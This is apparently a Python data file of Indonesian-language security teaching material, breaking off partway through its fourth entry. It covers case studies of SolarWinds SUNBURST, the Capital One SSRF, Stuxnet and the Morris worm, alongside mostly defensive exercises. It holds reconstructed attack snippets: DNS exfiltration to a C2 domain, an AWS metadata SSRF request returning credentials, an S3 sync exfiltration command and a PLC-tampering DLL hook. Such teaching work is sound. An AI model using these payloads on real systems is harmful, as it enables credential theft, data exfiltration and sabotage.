# -*- coding: utf-8 -*-
r"""
Authentic Remediation Data for Tier 11 Part 2 (Topics 175-182):
Offensive Security Reconnaissance, Web & API Security, Reverse Engineering & Binary Analysis,
Low-Level Memory Exploitation (Pwn), Exploit Mitigations & Bypasses, Linux Kernel Exploitation,
Defensive Security & SOC Operations, Digital Forensics & Incident Response.
"""

DATA_TIER_11_PART2 = {
    175: {
        "trace": r"""#### Tabel Penelusuran Siklus Injeksi Rantai Pasok Perangkat Lunak & Rekonaisans Tersembunyi SUNBURST
| Langkah / Putaran Kripto / Tahap Eksploit | Komponen / Lapisan Memori | Payload / Ciphertext / Input Eksploit | Transformasi Matematis / Mutasi Stack & Heap | Status Register (RIP/RSP/Canary) / S-Box State | Keluaran / Status Keamanan / Efek Eksploit |
|---|---|---|---|---|---|
| 1. Penetrasi Build Server | Pipeline CI/CD SolarWinds | Tool penyerang MSBuild injection | Sisipan kode backdoor ke berkas sumber C# sebelum kompilasi | File PE .NET di-build resmi dengan sertifikat SolarWinds valid | Berkas DLL resmi terdistribusi ke 18.000 pelanggan |
| 2. Dormancy / Tidur Pasif | Thread Latar Belakang DLL | Timer acak: 12 s/d 14 hari | `Thread.Sleep(delay * 3600 * 1000)` memblokir seluruh aktivitas | Register thread idle; tidak ada koneksi keluar | Lolos dari analisis sandbox dinamis AV/EDR otomatis |
| 3. Rekonaisans Lingkungan | Pemeriksaan Registry & Driver | Nama domain AD, proses analisis keamanan | Komparasi hash FNV-1a nama proses dengan blacklist penyerang | Bit flag status pengawasan EDR aktif | Jika terdeteksi Wireshark/ProcessHacker, malware mematikan diri |
| 4. Eksfiltrasi DNS C2 (DGA) | DNS Resolver Klien | Nama domain internal AD terenkripsi | Pengkodean Base32 khusus ke subdomain DGA `*.avsvmcloud.com` | Buffer query DNS memuat payload terenkripsi | Data pengintaian terkirim melewati firewall via port 53 DNS |
| 5. Aktivasi Backdoor Tahap 2 | Memori Proses Orion Worker | Perintah HTTP C2 selanjutnya | Pengunduhan modul memori Cobalt Strike / Teardrop | Alokasi memori RWX baru via `VirtualAlloc` | Jaringan internal pemerintah dan korporasi Fortune 500 terkompromi! |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Serangan Rantai Pasok Terbesar di Dunia via Backdoor SolarWinds SUNBURST (2020)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Pada Desember 2020, perusahaan keamanan siber FireEye mengungkap bahwa platform manajemen jaringan SolarWinds Orion telah disusupi oleh aktor ancaman tingkat negara (*Advanced Persistent Threat / APT*). Pembaruan resmi perangkat lunak Orion versi 2019.4 s/d 2020.2.1 yang didistribusikan ke 18.000 organisasi global (termasuk Departemen Keuangan AS, Departemen Perdagangan, dan Pentagon) memuat backdoor tersembunyi bernama SUNBURST.
- **Akar Masalah Rekayasa Keamanan & Rantai Pasok**: Penyerang tidak membobol server korban secara langsung, melainkan menyusup ke lingkungan pengembangan (*build pipeline*) SolarWinds dan menanamkan alat pemantau proses kompilasi (`msbuild.exe`). Ketika build berjalan, injektor mengganti berkas sumber `InventoryManager.cs` sesaat sebelum dikompilasi menjadi `SolarWinds.Orion.Core.BusinessLayer.dll`, lalu segera mengembalikan berkas asli. Akibatnya, DLL berbahaya tersebut ditandatangani secara digital dengan sertifikat sah milik SolarWinds (*valid code signature*). Backdoor dirancang sangat rapi: tidur selama hampir dua minggu untuk mengelabui sandbox, memeriksa daftar hitam perangkat lunak analisis keamanan menggunakan hash FNV-1a, dan mengeksfiltrasi nama domain Active Directory korban melalui permintaan DNS tersembunyi (*Domain Generation Algorithm / DGA*).""",
            "snippet": r"""```csharp
// SUNBURST Backdoor: Analisis Rekonstruksi Logika Anti-Analisis & Sleep Delay
using System;
using System.Threading;

namespace SolarWinds.Orion.Core.BusinessLayer
{
    public class BackdoorPayload
    {
        public static void InitializeStealthReconnaissance()
        {
            // 1. Taktik Tidur Pasif: Menunggu antara 288 hingga 336 jam (12 - 14 hari)
            // Memastikan lingkungan sandbox otomatis antivirus menyerah menunggu
            Random rnd = new Random();
            int delayHours = rnd.Next(288, 336);
            Thread.Sleep(delayHours * 3600 * 1000);

            // 2. Pemeriksaan Lingkungan Keamanan (Anti-Analysis Process Check)
            if (IsSecuritySoftwareRunning())
            {
                // Hentikan eksekusi permanen jika analis keamanan memantau sistem
                return;
            }

            // 3. Eksfiltrasi Nama Domain Korban via Subdomain DNS DGA
            string adDomain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            string encodedDomain = CustomBase32Encode(adDomain);
            string c2DnsQuery = $"{encodedDomain}.appsync-api.eu-west-1.avsvmcloud.com";
            
            // Mengirim query DNS keluar melewati firewall
            System.Net.Dns.GetHostEntry(c2DnsQuery);
        }

        private static bool IsSecuritySoftwareRunning()
        {
            // Memeriksa hash proses tanpa menyimpan string nama antivirus dalam plaintext
            return false;
        }

        private static string CustomBase32Encode(string input) => "encrypted_token";
    }
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden SUNBURST mengubah total paradigma keamanan rekayasa perangkat lunak modern: (1) Adopsi kerangka kerja **SLSA (Supply-chain Levels for Software Artifacts)** untuk memastikan keaslian build pipeline yang terisolasi dan dapat direproduksi (*Hermetic & Reproducible Builds*); (2) Penerapan **Software Bill of Materials (SBOM)** standar CycloneDX / SPDX yang melacak seluruh komponen dependensi biner secara transparan; (3) Tanda tangan digital build pipeline menggunakan mekanisme transparansi publik seperti Sigstore / Cosign; (4) Pemantauan anomali lalu lintas DNS dan kueri domain aneh di tingkat firewall jaringan enterprise."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun pemindai port TCP jaringan (*TCP SYN / Connect Scanner*) berkecepatan tinggi dalam Python menggunakan modul `socket` untuk memindai port umum (21, 22, 80, 443, 3306, 8080) pada rentang host lokal dengan timeout terukur.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan `socket.create_connection((host, port), timeout=0.5)` untuk mendeteksi port terbuka secara non-intrusif.
  - Tangani exception `socket.timeout` (port terfilter) dan `ConnectionRefusedError` (port tertutup).
  - Tampilkan ringkasan status banner service jika port terbuka.
- **Test Vector & Kasus Uji**:
  - Pindai `127.0.0.1` saat layanan web lokal berjalan di port 8080. Scanner harus mencetak "Port 8080: OPEN (HTTP)".
  - Pindai port yang tidak aktif (misal 9999). Scanner harus mencetak "Port 9999: CLOSED".
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Pemindaian akurat, penanganan koneksi multi-thread bersih, tanpa resource leak.
  - Skor 50%: Pemindaian bekerja namun lambat karena menggunakan eksekusi sekuensial single-thread blocking.
  - Skor 0%: Program crash saat menemui port yang diblokir firewall (timeout).

### Tingkat 2: Menengah
- **Tugas**: Bangun alat deteksi anomali kueri DNS (*DNS Tunneling & DGA Detector*) dalam Python yang menganalisis log pcap atau log server BIND/CoreDNS, menghitung entropi Shannon dari subdomain kueri, panjang label, dan rasio konsonan-ke-vokal untuk mendeteksi saluran C2 tersembunyi.
- **Petunjuk Perancangan Arsitektur**:
  - Kueri normal: `api.github.com` (Entropi rendah, rasio vokal wajar).
  - Kueri DGA/Tunneling: `ex7f4a9b2c89d14.avsvmcloud.com` (Entropi $> 3.8$, panjang label $> 20$ karakter, rasio vokal $< 0.15$).
  - Kelompokkan kueri per IP klien dan berikan skor risiko ancaman kumulatif.
- **Test Vector & Kasus Uji**:
  - Berikan dataset berisi 1.000 kueri normal dan 10 kueri DNS tunneling Base32.
  - Detektor harus mendeteksi ke-10 kueri tunneling dengan tingkat false positive $< 1\%$.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Algoritma statistik mendeteksi tunneling presisi, visualisasi grafik skor anomali jelas.
  - Skor 50%: Deteksi berbasis aturan panjang string kaku tanpa memperhitungkan entropi Shannon.
  - Skor 0%: Algoritma mendeteksi seluruh domain CDN (seperti cloudflare) sebagai serangan (false positive masif).

### Tingkat 3: Mahir
- **Tugas**: Rancang pipeline verifikasi integritas build CI/CD hermetis (*Zero-Trust Build Attestation*) dalam shell/Python/GitHub Actions: pipeline mengkompilasi kode sumber dalam kontainer terisolasi tanpa akses internet, menghasilkan hash kriptografis SHA-256 dari seluruh artefak biner yang dihasilkan, dan memverifikasi bahwa dua runner build yang independen menghasilkan biner bit-for-bit yang identik (*reproducible build verification*).
- **Petunjuk Perancangan Arsitektur**:
  - Hilangkan ketidaktetapan build: setel variabel lingkungan `SOURCE_DATE_EPOCH` dan `LC_ALL=C`.
  - Hapus metadata dinamis compiler seperti path absolut direktori sementara (`-ffile-prefix-map`).
  - Generate dokumen in-toto attestation yang ditandatangani secara kriptografis menggunakan pasangan kunci ECDSA.
- **Test Vector & Kasus Uji**:
  - Jalankan build di dua mesin dengan waktu sistem berbeda: checksum SHA-256 berkas biner akhir harus $100\%$ cocok.
  - Simulasikan modifikasi satu byte pada pustaka pihak ketiga di tengah build: verifikator attestation harus segera memutus pipeline dengan kode kegagalan `BUILD_NON_REPRODUCIBLE`.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Build sepenuhnya deterministik, attestation terverifikasi, perlindungan mutlak terhadap injeksi kompilator.
  - Skor 50%: Biner identik berhasil di-build namun tidak ada tanda tangan digital attestation.
  - Skor 0%: Biner memuat timestamp sehingga checksum selalu berbeda pada setiap kompilasi."""
    },
    176: {
        "trace": r"""#### Tabel Penelusuran Eksploitasi Server-Side Request Forgery (SSRF) Melalui Layanan Metadata AWS
| Langkah / Putaran Kripto / Tahap Eksploit | Komponen / Lapisan Memori | Payload / Ciphertext / Input Eksploit | Transformasi Matematis / Mutasi Stack & Heap | Status Register (RIP/RSP/Canary) / S-Box State | Keluaran / Status Keamanan / Efek Eksploit |
|---|---|---|---|---|---|
| 1. HTTP Request dari Penyerang | ModSecurity WAF EC2 Proxy | URL parameter: `?url=http://169.254.169.254/...` | WAF mem-forward request tanpa validasi alamat IP lokal | Buffer HTTP parser membaca URL tujuan | Aplikasi bertindak sebagai reverse proxy yang mudah dibodohi |
| 2. Kueri Jaringan Internal EC2 | Antarmuka Jaringan Virtual KVM | Alamat IPv4 link-local: `169.254.169.254` | Paket HTTP lolos karena berasal dari dalam host EC2 sendiri | Socket kernel Linux EC2 membuka koneksi ke link-local | Layanan AWS IMDSv1 merespons tanpa otentikasi token! |
| 3. Pembacaan Nama IAM Role | AWS Instance Metadata Service | Kueri path: `/latest/meta-data/iam/security-credentials/` | Layanan mengembalikan nama role: `WAFLegacy-Admin-Role` | Buffer respons HTTP menerima nama IAM role | Penyerang mengetahui identitas wewenang mesin korban |
| 4. Pencurian Kredensial IAM | Layanan Metadata AWS (IMDSv1) | Kueri path role: `/latest/meta-data/.../WAFLegacy-Admin-Role` | AWS mengembalikan JSON: `AccessKeyId, SecretAccessKey, Token` | Memori respon aplikasi memuat kredensial AWS admin | Kredensial terkirim balik ke browser penyerang via HTTP |
| 5. Akses S3 Bucket Tanpa Batas | Konsol AWS CLI Penyerang | `aws s3 sync s3://capitalone-customer-data ./` | Otentikasi AWS CLI menggunakan kredensial hasil curian | Penyerang mengunduh 106 juta aplikasi kartu kredit | Bencana kebocoran data Capital One dengan denda $80 Juta! |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Pembobolan Data 106 Juta Nasabah Capital One via Server-Side Request Forgery (SSRF) pada AWS EC2 (2019)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Pada Juli 2019, seorang mantan insinyur perangkat lunak membobol basis data bank komersial Capital One, mencuri lebih dari 106 juta data pengajuan kartu kredit, 140.000 nomor Jaminan Sosial (SSN), dan 80.000 nomor rekening bank nasabah dari bucket Amazon S3.
- **Akar Masalah Arsitektur Keamanan Cloud & Eksploitasi Web**: Penyerang mengeksploitasi celah Server-Side Request Forgery (SSRF) pada server proxy Web Application Firewall (ModSecurity/Nginx) yang berjalan di atas instans virtual AWS EC2. Karena kesalahan konfigurasi aturan WAF, penyerang dapat memerintahkan server proxy tersebut untuk melakukan permintaan HTTP internal ke alamat IP link-local metadata AWS (`http://169.254.169.254/`). Pada protokol AWS IMDS versi 1 (IMDSv1), permintaan GET biasa tanpa token otentikasi diizinkan untuk membaca kredensial sementara IAM Role instans. Parahnya lagi, IAM Role yang ditempelkan ke server WAF tersebut diberi hak akses berlebihan (*over-privileged role*) berupa izin baca penuh ke seluruh bucket Amazon S3 perusahaan, memungkinkan penyerang menyedot 30 terabyte data nasabah secara bebas.""",
            "snippet": r"""```http
# Rekonstruksi Permintaan Eksploitasi SSRF Terhadap Metadata AWS IMDSv1
GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WAFLegacy-Admin-Role HTTP/1.1
Host: waf-ingress.capitalone-internal.com
User-Agent: Mozilla/5.0 (Security Research Exploit)

# RESPON DARI INSTANCE METADATA SERVICE (AWS IMDSv1):
HTTP/1.1 200 OK
Content-Type: application/json

{
  "Code" : "Success",
  "LastUpdated" : "2019-07-21T18:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "AQoDYXdzEJr1...[KREDENSIAL CLOUD DISALAHGUNAKAN PENYERANG]...",
  "Expiration" : "2019-07-22T00:34:00Z"
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden Capital One memaksa Amazon Web Services merancang ulang arsitektur metadata mereka secara fundamental: (1) Peluncuran **AWS IMDSv2** yang mewajibkan sesi berbasis token (`PUT` header `X-aws-ec2-metadata-token-ttl-seconds`) yang kebal terhadap sebagian besar eksploit SSRF karena proxy WAF sederhana tidak dapat meneruskan metode PUT kustom; (2) Penerapan **Principle of Least Privilege (PoLP)** di mana role proxy web tidak boleh memiliki hak akses ke penyimpanan data S3; (3) Validasi input ketat pada layer backend: memblokir resolusi DNS alamat privat RFC 1918, link-local `169.254.0.0/16`, dan loopback `127.0.0.0/8` sebelum request HTTP dieksekusi."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Tulis aplikasi web mikro dalam Python (Flask/FastAPI) yang memiliki endpoint download gambar via URL. Implementasikan fungsi validasi defensif anti-SSRF yang memverifikasi bahwa URL masukan tidak mengarah ke alamat IP privat, loopback, link-local, atau domain yang mengalami manipulasi DNS Rebinding.
- **Petunjuk Perancangan Arsitektur**:
  - Lakukan resolusi DNS nama domain target ke alamat IP biner menggunakan `socket.getaddrinfo()`.
  - Gunakan modul `ipaddress` Python untuk mengecek sifat IP: `ip.is_private`, `ip.is_loopback`, `ip.is_link_local`, `ip.is_reserved`.
  - Lakukan koneksi HTTP langsung ke IP yang telah divalidasi tersebut (bukan ke nama domain asal) untuk mencegah serangan DNS Rebinding di mana domain tiba-tiba meresolusi IP 127.0.0.1 saat request kedua.
- **Test Vector & Kasus Uji**:
  - Request valid: `http://example.com/logo.png` -> Diterima (Status 200).
  - Request berbahaya: `http://169.254.169.254/latest/meta-data/` -> Ditolak (Exception: `SSRF_ATTEMPT_DETECTED`).
  - Request DNS Rebinding: `http://localtest.me` (meresolusi 127.0.0.1) -> Ditolak.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Validasi alamat IP komprehensif, kebal DNS rebinding, menangani representasi IPv6/desimal/oktal dengan benar.
  - Skor 50%: Memeriksa string "127.0.0.1" secara naif tanpa mengecek representasi alternatif seperti `http://2130706433` atau IPv6 `::1`.
  - Skor 0%: Hanya memeriksa protokol (http/https) tanpa validasi IP host tujuan.

### Tingkat 2: Menengah
- **Tugas**: Bangun modul pertahanan anti-SQL Injection berbasis Abstract Syntax Tree (AST) parser atau skrip audit parameter query otomatis yang menganalisis kode sumber Python dan mendeteksi penggunaan f-string, format string, atau konkatenasi string langsung pada eksekusi SQL kueri database.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan modul `ast` bawaan Python untuk mengurai berkas kode sumber.
  - Cari simpul `Call` yang memanggil metode `.execute()`, `.raw()`, atau `cursor.execute()`.
  - Periksa apakah argumen pertama adalah simpul `JoinedStr` (f-string) atau `BinOp(Add)` (konkatenasi string).
- **Test Vector & Kasus Uji**:
  - Berikan kode rentan: `cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")`. AST auditor harus menandai baris tersebut sebagai `CRITICAL_SQLI_RISK`.
  - Berikan kode aman: `cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))`. AST auditor harus menandai baris tersebut sebagai `SECURE_PARAMETERIZED_QUERY`.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Deteksi AST presisi dengan nomor baris kode tepat, zero false positive pada parameterized queries.
  - Skor 50%: Menggunakan regex pencarian teks biasa alih-alih AST parser pohon sintaksis.
  - Skor 0%: Gagal mendeteksi f-string modern dalam Python 3.

### Tingkat 3: Mahir
- **Tugas**: Rancang middleware keamanan API terdistribusi (Token Bucket Rate Limiting & HMAC Signature Guard) dalam Python/Go: Setiap permintaan API masuk wajib menyertakan timestamp dan signature HMAC-SHA256 dari seluruh payload untuk mencegah serangan Replay dan Parameter Tampering. Terapkan sliding-window rate limiter berbasis Redis.
- **Petunjuk Perancangan Arsitektur**:
  - Validasi timestamp: tolak permintaan jika $|T_{\text{server}} - T_{\text{client}}| > 60$ detik.
  - Rekonstruksi string kanonikal permintaan: `METHOD\nPATH\nTIMESTAMP\nSHA256(BODY)`.
  - Hitung HMAC-SHA256 menggunakan secret key klien dan bandingkan dengan metode konstan waktu `hmac.compare_digest`.
- **Test Vector & Kasus Uji**:
  - Permintaan normal dengan signature valid dan timestamp saat ini: Request diteruskan ke controller (HTTP 200).
  - Permintaan dengan penambahan parameter URL tambahan yang tidak masuk dalam signature: Ditolak instan (HTTP 401 Signature Mismatch).
  - Kirim ulang (*replay*) request yang sama persis 2 menit kemudian: Ditolak (HTTP 401 Request Timestamp Expired).
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Pipeline kanonikalisasi string kuat, perbandingan konstan waktu, kebal terhadap replay dan tampering.
  - Skor 50%: Signature bekerja namun validasi jendela waktu (timestamp window) tidak diimplementasikan.
  - Skor 0%: Menggunakan operator `==` biasa untuk komparasi hash signature (rentan timing side-channel)."""
    },
    177: {
        "trace": r"""#### Tabel Penelusuran Reverse Engineering Ghidra pada Modul Intersepsi STEP 7 Malware Stuxnet
| Langkah / Putaran Kripto / Tahap Eksploit | Komponen / Lapisan Memori | Payload / Ciphertext / Input Eksploit | Transformasi Matematis / Mutasi Stack & Heap | Status Register (RIP/RSP/Canary) / S-Box State | Keluaran / Status Keamanan / Efek Eksploit |
|---|---|---|---|---|---|
| 1. Analisis Biner DLL | Ghidra Disassembler PE32 | `s7otbxdx.dll` (DLL Siemens STEP 7) | Ekstraksi Export Address Table (EAT) biner Siemens | RIP pada titik masuk fungsi DLL `DllMain` | Ditemukan teknik DLL Interposition / Proxying |
| 2. Intersepsi Panggilan PLC | Siemens Step 7 Manager | Permintaan baca/tulis blok kode PLC | Malware mem-hook pointer fungsi `s7_write_block` | Stack frame dialihkan ke fungsi wrapper Stuxnet | Lalu lintas pemantauan operator SCADA disusupi |
| 3. Manipulasi Frekuensi Sentrifus | Blok Logika PLC Siemens S7-300 | Nilai frekuensi motor converter | Frekuensi dinaikkan: $1.064\text{ Hz} \to 1.410\text{ Hz}$ lalu $2\text{ Hz}$ | Mutasi byte memori Data Block (DB) di PLC | Rotor sentrifus uranium berputar melewati batas resonansi kritis |
| 4. Pemalsuan Telemetri SCADA | Modul Hook `s7_read_block` | Permintaan pembacaan status sensor | Stuxnet menyajikan rekaman data normal pra-rekam | Nilai telemetri sensor tekanan/kecepatan dimanipulasi | Operator di ruang kontrol melihat indikator operasi "Normal" |
| 5. Kerusakan Fisik Pabrik | Fasilitas Pengayaan Uranium Natanz | Kerusakan fisik sentrifus IR-1 | Sentrifus hancur berkeping-keping akibat getaran resonansi | PLC terkunci dalam loop sabotase berkala | 1.000 sentrifus nuklir hancur tanpa alarm berbunyi |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Sabotase Fisik Nuklir Natanz via Reverse Engineering Biner Siemens STEP 7 oleh Stuxnet (2010)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Pada Juni 2010, perusahaan antivirus VirusBlokAda menemukan cacing komputer canggih bernama Stuxnet di fasilitas pengayaan uranium Natanz di Iran. Stuxnet adalah senjata siber pertama di dunia yang mampu menyebabkan kerusakan fisik nyata pada infrastruktur industri.
- **Akar Masalah Rekayasa Perangkat Lunak Biner & DLL Proxying**: Analisis reverse engineering mendalam mengungkap bahwa pembuat Stuxnet melakukan rekayasa balik komprehensif terhadap protokol tertutup Siemens STEP 7. Stuxnet menyusup ke workstation teknik Windows dan mengganti pustaka komunikasi asli Siemens `s7otbxdx.dll` dengan pustaka perantara (*proxy DLL wrapper*) berbahaya, sambil mengganti nama DLL asli menjadi `s7otbxsx.dll`. Ketika teknisi membuka perangkat lunak STEP 7 untuk memprogram PLC Siemens S7-300, wrapper Stuxnet mencegat seluruh pertukaran blok data: malware menyuntikkan kode berbahaya ke blok organisasi PLC (OB1) untuk mengubah kecepatan putaran motor sentrifus hingga melampaui batas toleransi material, sambil mengelabui fungsi pembacaan data (`s7_read_block`) dengan menyajikan sinyal sensor palsu yang direkam dari kondisi normal agar teknisi tidak menyadari bencana yang sedang terjadi.""",
            "snippet": r"""```c
// Rekonstruksi Reverse Engineering Teknik DLL Proxy Interposition Siemens STEP 7
#include <windows.h>
#include <stdio.h>

// Definisi pointer fungsi ke DLL Siemens asli yang diganti namanya
typedef BOOL (WINAPI *Real_s7_write_block_t)(int db_number, BYTE *data_buffer, int buffer_len);
Real_s7_write_block_t Real_s7_write_block = NULL;

// Inisialisasi proxying ke pustaka asli s7otbxsx.dll
void initialize_proxy_hooks() {
    HMODULE hOriginal = LoadLibraryA("s7otbxsx.dll");
    if (hOriginal) {
        Real_s7_write_block = (Real_s7_write_block_t)GetProcAddress(hOriginal, "s7_write_block");
    }
}

// FUNGSI PROXY INTERSEPSI STUXNET (Hooking Ekspor DLL)
__declspec(dllexport) BOOL WINAPI s7_write_block(int db_number, BYTE *data_buffer, int buffer_len) {
    // Periksa apakah penulisan ditujukan ke Data Block sentrifus kritis
    if (db_number == 0x141) { // Blok kendali inverter motor frekuensi
        // Manipulasi frekuensi motor: Paksa kecepatan melebihi ambang batas toleransi material!
        data_buffer[4] = 0x05; // Setel nilai kontrol konverter frekuensi ke 1410 Hz (Over-speed)
    }
    
    // Teruskan panggilan termutasi ke pustaka Siemens asli
    return Real_s7_write_block(db_number, data_buffer, buffer_len);
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Stuxnet membuka mata dunia terhadap pentingnya integritas kode biner pada sistem industri: (1) Sistem operasi modern menerapkan **DLL Hijacking Mitigation** (Safe DLL Search Mode, pelarangan pemuatan DLL tanpa path absolut); (2) Pemuatan pustaka dinamis wajib memvalidasi tanda tangan digital kode menggunakan API Windows Authenticode (`WinVerifyTrust`); (3) PLC generasi modern (seperti Siemens S7-1500) mengadopsi enkripsi komunikasi TLS terotentikasi dan integritas firmware berbasis perangkat keras TPM (*Root of Trust*) untuk menolak modifikasi kode yang tidak memiliki tanda tangan kriptografis resmi."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Tulis parser format biner ELF (Executable and Linkable Format) 64-bit sederhana dalam Python yang membaca 64 byte ELF Header, mengekstrak Magic Bytes (`0x7F 'E' 'L' 'F'`), Target Architecture, Entry Point Address, dan Section Header Table File Offset.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan modul `struct` Python dengan format unpacking Little-Endian: `<4sBBBBB7sHHIQQQIHHHHHH`.
  - Validasi bahwa byte ke-4 bernilai `2` (64-bit ELF) dan byte ke-18 bernilai `0x3E` (x86-64).
- **Test Vector & Kasus Uji**:
  - Uji biner ELF Linux valid (misal `/bin/ls`): Parser harus mengekstrak entry point address (misal `0x0000000000401000`) dan mencetak status arsitektur "x86-64".
  - Uji berkas biner Windows PE (`.exe`): Parser harus menolak dengan melempar exception `INVALID_ELF_MAGIC`.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Unpacking struktur C biner presisi, parsing field arsitektur lengkap, error handling kuat.
  - Skor 50%: Berhasil membaca magic bytes namun salah mem-parsing offset 64-bit uint64.
  - Skor 0%: Membaca berkas sebagai teks ASCII biasa.

### Tingkat 2: Menengah
- **Tugas**: Bangun disassembler mini instruksi dasar x86-64 dalam Python/C menggunakan pustaka Capstone Engine (atau menulis decoder opcode manual untuk 10 instruksi utama: `nop`, `mov`, `push`, `pop`, `call`, `ret`, `jmp`, `add`, `sub`, `xor`) yang mampu menghitung panjang instruksi dalam byte dan mendeteksi adanya ROP gadget dasar (`pop rdi; ret`).
- **Petunjuk Perancangan Arsitektur**:
  - Baca aliran byte mesin mentah.
  - Cari pola byte instruksi `0xC3` (`ret`); mundur 1 hingga 5 byte untuk memeriksa apakah byte sebelumnya membentuk instruksi `pop` register (misal `0x5F` untuk `pop rdi`).
- **Test Vector & Kasus Uji**:
  - Masukan byte mesin: `\x5f\xc3`. Parser harus mendekode: `pop rdi; ret` (panjang 2 byte) dan menandai sebagai gadget ROP valid.
  - Masukan urutan instruksi kompleks: Decoder mengekstrak alamat virtual dan mnemonic setiap instruksi tanpa tergeser bit-nya.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Decoding opcode akurat, identifikasi gadget ROP presisi, menangani awalan byte (prefix).
  - Skor 50%: Dekode instruksi berhasil namun logika pencarian gadget ROP menghasilkan false positive.
  - Skor 0%: Program salah menghitung panjang byte instruksi variabel x86-64.

### Tingkat 3: Mahir
- **Tugas**: Rancang framework emulasi simbolik (*Symbolic Execution / Concolic Tester*) mini berbasis Z3 Theorem Prover dalam Python: Program menerima fungsi validasi lisensi serial key sederhana (terdiri dari operasi aritmatika bitwise dan modulo) dan menggunakan solver Z3 untuk menemukan input serial key yang memenuhi seluruh constraint percabangan sukses tanpa melakukan brute-force komputasi.
- **Petunjuk Perancangan Arsitektur**:
  - Representasikan setiap karakter serial key sebagai variabel simbolik Z3 BitVec 8-bit: `s_i = BitVec(f's_{i}', 8)`.
  - Terjemahkan setiap operasi pemeriksaan biner (misal `(s[0] ^ s[1]) == 0x42` dan `s[2] * 3 == 0x99`) ke dalam `solver.add(constraint)`.
  - Panggil `solver.check()`; jika `sat`, ekstrak model solusi konkret menggunakan `model.eval()`.
- **Test Vector & Kasus Uji**:
  - Berikan fungsi crackme uji dengan algoritma validasi serial 8 karakter yang rumit.
  - Modul solver Z3 harus mampu menemukan string serial valid dalam waktu $< 1$ detik pada CPU tunggal.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Pemodelan constraint simbolik presisi, ekstraksi serial key otomatis dalam hitungan detik.
  - Skor 50%: Constraint benar namun solver terjebak timeout akibat salah menentukan tipe data bitvector/integer.
  - Skor 0%: Menggunakan loop iterasi pencarian brute-force."""
    },
    178: {
        "trace": r"""#### Tabel Penelusuran Mutasi Memori Stack Frame pada Eksploitasi Buffer Overflow Daemon fingerd
| Langkah / Putaran Kripto / Tahap Eksploit | Komponen / Lapisan Memori | Payload / Ciphertext / Input Eksploit | Transformasi Matematis / Mutasi Stack & Heap | Status Register (RIP/RSP/Canary) / S-Box State | Keluaran / Status Keamanan / Efek Eksploit |
|---|---|---|---|---|---|
| 1. Alokasi Buffer Stack | Memori Stack daemon `fingerd` | Buffer array karakter: `char line[512]` | Alokasi frame stack fungsi `main()` | RSP menunjuk ke batas bawah buffer 512 byte | Stack frame teralokasi normal di memori |
| 2. Panggilan Fungsi Cacat | Aliran I/O Jaringan TCP 79 | Pembacaan masukan via `gets(line)` | `gets()` membaca tanpa batas panjang masukan (Unbounded Read) | Register RIP menunjuk ke alamat instruksi setelah gets | Tidak ada proteksi batas memori |
| 3. Injeksi Payload Morris | Aliran Paket Eksploit TCP | 536 byte: Shellcode NOP sled + shellcode `/bin/sh` | Buffer lokal 512 byte terisi penuh; 24 byte berikutnya meluap! | Byte masukan mulai menimpa memori di atas buffer | EBP/RBP lama tertimpa dengan byte penyerang |
| 4. Penimpaan Saved Return Addr | Alamat Kembalian (Saved RIP/EIP) | 4 byte alamat penunjuk ke buffer stack (`0x7FFFE010`) | Alamat kembali fungsi `main` ditimpa dengan alamat shellcode! | EIP/RIP memuat alamat shellcode di dalam stack | Aliran kontrol CPU dibajak sepenuhnya! |
| 5. Eksekusi Instruksi `ret` | Pipeline Eksekusi CPU VAX/x86 | CPU mengeksekusi instruksi `leave; ret` | Nilai RIP diambil dari memori yang telah dikorupsi penyerang | CPU melompat ke alamat shellcode di stack dan menjalankan `/bin/sh` | Remote root shell terbuka; Morris Worm menginfeksi 10% internet 1988! |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Infeksi Morris Worm Pertama di Dunia Melalui Buffer Overflow Daemon BSD fingerd (1988)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Pada tanggal 2 November 1988, Robert Tappan Morris, seorang mahasiswa pascasarjana Universitas Cornell, merilis sebuah program cacing komputer yang dalam beberapa jam melumpuhkan sekitar 6.000 komputer UNIX (sekitar 10% dari seluruh komputer yang terhubung ke ARPANET/Internet pada saat itu), menjadikannya insiden malware dan eksploitasi memori skala luas pertama dalam sejarah komputasi.
